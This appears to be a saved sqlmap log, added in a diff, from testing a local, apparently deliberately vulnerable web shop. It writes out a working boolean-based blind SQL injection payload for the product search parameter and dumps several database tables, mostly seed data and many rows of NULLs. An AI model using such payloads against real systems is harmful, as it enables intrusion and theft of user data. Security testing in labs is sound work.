@@ -1,0 +1,874 @@
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 7567=7567 AND ('QywD' LIKE 'QywD
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 7567=7567 AND ('QywD' LIKE 'QywD
+---
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+Table: Addresses
+[6 entries]
++----+--------+--------------+--------------------+------------------------------+---------+------------------+------------+--------------------------------+--------------------------------+--------------------+
+| id | UserId | city         | state              | country                      | zipCode | fullName         | mobileNum  | updatedAt                      | createdAt                      | streetAddress      |
++----+--------+--------------+--------------------+------------------------------+---------+------------------+------------+--------------------------------+--------------------------------+--------------------+
+| 1  | 4      | Uetersen     | Schleswig-Holstein | Germany                      | 25436   | Bjoern Kimminich | 4917000001 | 2026-03-04 18:14:16.722 +00:00 | 2026-03-04 18:14:16.722 +00:00 | Am Lokalhorst 42   |
+| 2  | 17     | Mocktown     | Testilvania        | United Fakedom               | 12345   | Tim Tester       | 4917000000 | 2026-03-04 18:14:16.752 +00:00 | 2026-03-04 18:14:16.752 +00:00 | Dummystreet 42     |
+| 3  | 1      | Test         | Test               | Test                         | 4711    | Administrator    | 1234567890 | 2026-03-04 18:14:16.755 +00:00 | 2026-03-04 18:14:16.755 +00:00 | 0815 Test Street   |
+| 4  | 2      | Deck 5       | USS Enterprise     | Space                        | 1701    | Jim              | 523423432  | 2026-03-04 18:14:16.755 +00:00 | 2026-03-04 18:14:16.755 +00:00 | Room 3F 121        |
+| 5  | 2      | Deneva       | Beta Darius System | United Federation of Planets | GSK783  | Sam              | 1000000783 | 2026-03-04 18:14:16.755 +00:00 | 2026-03-04 18:14:16.755 +00:00 | Deneva Colony      |
+| 6  | 3      | New New York | New New York       | Planet Earth                 | 10001   | Bender           | 797675345  | 2026-03-04 18:14:16.756 +00:00 | 2026-03-04 18:14:16.756 +00:00 | Robot Arms Apts 42 |
++----+--------+--------------+--------------------+------------------------------+---------+------------------+------------+--------------------------------+--------------------------------+--------------------+
+
+Database: SQLite_masterdb
+Table: Recycles
+[9 entries]
++----+--------+-----------+--------------------------------+----------+----------+--------------------------------+--------------------------------+
+| id | UserId | AddressId | date                           | isPickup | quantity | updatedAt                      | createdAt                      |
++----+--------+-----------+--------------------------------+----------+----------+--------------------------------+--------------------------------+
+| 1  | 2      | 4         | 2270-01-17 00:00:00.000 +00:00 | 1        | 800      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 2  | 3      | 6         | 2006-01-14 00:00:00.000 +00:00 | 1        | 1320     | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 3  | 4      | 1         | 2018-04-16 00:00:00.000 +00:00 | 1        | 120      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 4  | 1      | 3         | 2018-01-17 00:00:00.000 +00:00 | 1        | 300      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 5  | 4      | 1         | 2018-03-17 00:00:00.000 +00:00 | 1        | 350      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 6  | 3      | 6         | 2018-07-17 00:00:00.000 +00:00 | 1        | 200      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 7  | 4      | 1         | 2018-03-19 00:00:00.000 +00:00 | 1        | 140      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 8  | 1      | 3         | 2018-05-12 00:00:00.000 +00:00 | 1        | 150      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
+| 9  | 16     | 2         | 2019-02-18 00:00:00.000 +00:00 | 1        | 500      | 2026-03-04 18:14:17.313 +00:00 | 2026-03-04 18:14:17.313 +00:00 |
++----+--------+-----------+--------------------------------+----------+----------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Wallets
+[26 entries]
++------+--------+---------+-----------+-----------+
+| id   | UserId | balance | updatedAt | createdAt |
++------+--------+---------+-----------+-----------+
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
+| NULL | NULL   | NULL    | NULL      | NULL      |
++------+--------+---------+-----------+-----------+
+
+Database: SQLite_masterdb
+Table: Memories
+[10 entries]
++----+--------+------------------------------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| id | UserId | caption                                              | imagePath                                                                                           | updatedAt                      | createdAt                      |
++----+--------+------------------------------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| 1  | 13     | ? #zatschi #whoneedsfourlegs                         | assets/public/images/uploads/???-#zatschi-#whoneedsfourlegs-1572600969477.jpg                       | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 2  | 4      | Magn(et)ificent!                                     | assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg                                     | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 3  | 4      | My rare collectors item! [??$??(?? ?? ?? ????)??$??] | assets/public/images/uploads/my-rare-collectors-item!-[??$??(??-??-??-????)??$??]-1572603645543.jpg | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 4  | 21     | Welcome to the Bee Haven (/#/bee-haven)?             | assets/public/images/uploads/BeeHaven.png                                                           | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 5  | 13     | Sorted the pieces, starting assembly process...      | assets/public/images/uploads/sorted-the-pieces,-starting-assembly-process-1721152307290.jpg         | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 6  | 13     | Building something literally bottom up...            | assets/public/images/uploads/building-something-literally-bottom-up-1721152342603.jpg               | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 7  | 13     | Putting in the hardware...                           | assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg                              | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 8  | 13     | Everything up and running!                           | assets/public/images/uploads/everything-up-and-running!-1721152385146.jpg                           | 2026-03-04 18:14:17.374 +00:00 | 2026-03-04 18:14:17.374 +00:00 |
+| 9  | 18     | I love going hiking here...                          | assets/public/images/uploads/favorite-hiking-place.png                                              | 2026-03-04 18:14:17.377 +00:00 | 2026-03-04 18:14:17.377 +00:00 |
+| 10 | 19     | My old workplace...                                  | assets/public/images/uploads/IMG_4253.jpg                                                           | 2026-03-04 18:14:17.378 +00:00 | 2026-03-04 18:14:17.378 +00:00 |
++----+--------+------------------------------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Users
+[26 entries]
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+| id   | role | email | username | isActive | password | updatedAt | deletedAt | createdAt | totpSecret | lastLoginIp | deluxeToken | profileImage |
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
+| NULL | NULL | NULL  | NULL     | NULL     | NULL     | NULL      | NULL      | NULL      | NULL       | NULL        | NULL        | NULL         |
++------+------+-------+----------+----------+----------+-----------+-----------+-----------+------------+-------------+-------------+--------------+
+
+Database: SQLite_masterdb
+Table: Baskets
+[5 entries]
++----+--------+--------+--------------------------------+--------------------------------+
+| id | UserId | coupon | updatedAt                      | createdAt                      |
++----+--------+--------+--------------------------------+--------------------------------+
+| 1  | 1      | NULL   | 2026-03-04 18:14:17.290 +00:00 | 2026-03-04 18:14:17.290 +00:00 |
+| 2  | 2      | NULL   | 2026-03-04 18:14:17.290 +00:00 | 2026-03-04 18:14:17.290 +00:00 |
+| 3  | 3      | NULL   | 2026-03-04 18:14:17.290 +00:00 | 2026-03-04 18:14:17.290 +00:00 |
+| 4  | 11     | NULL   | 2026-03-04 18:14:17.290 +00:00 | 2026-03-04 18:14:17.290 +00:00 |
+| 5  | 16     | NULL   | 2026-03-04 18:14:17.290 +00:00 | 2026-03-04 18:14:17.290 +00:00 |
++----+--------+--------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Challenges
+[110 entries]
++------+------+------+------+--------+----------+-----------+-----------+------------+-------------+-------------+---------------+--------------------+
+| id   | key  | tags | name | solved | category | updatedAt | createdAt | difficulty | description | disabledEnv | mitigationUrl | hasCodingChallenge |
++------+------+------+------+--------+----------+-----------+-----------+------------+-------------+-------------+---------------+--------------------+
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
+| NULL | NULL | NULL | NULL | NULL   | NULL     | NULL      | NULL      | NULL       | NULL        | NULL        | NULL          | NULL               |
++------+------+------+------+--------+----------+-----------+-----------+------------+-------------+-------------+---------------+--------------------+
+
+Database: SQLite_masterdb
+Table: Complaints
+[1 entry]
++----+--------+------+---------------------------------------------------------------------+--------------------------------+--------------------------------+
+| id | UserId | file | message                                                             | updatedAt                      | createdAt                      |
++----+--------+------+---------------------------------------------------------------------+--------------------------------+--------------------------------+
+| 1  | 3      | NULL | I'll build my own eCommerce business! With Black Jack! And Hookers! | 2026-03-04 18:14:17.312 +00:00 | 2026-03-04 18:14:17.312 +00:00 |
++----+--------+------+---------------------------------------------------------------------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Quantities
+[46 entries]
++------+-----------+----------+-----------+-----------+--------------+
+| id   | ProductId | quantity | updatedAt | createdAt | limitPerUser |
++------+-----------+----------+-----------+-----------+--------------+
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
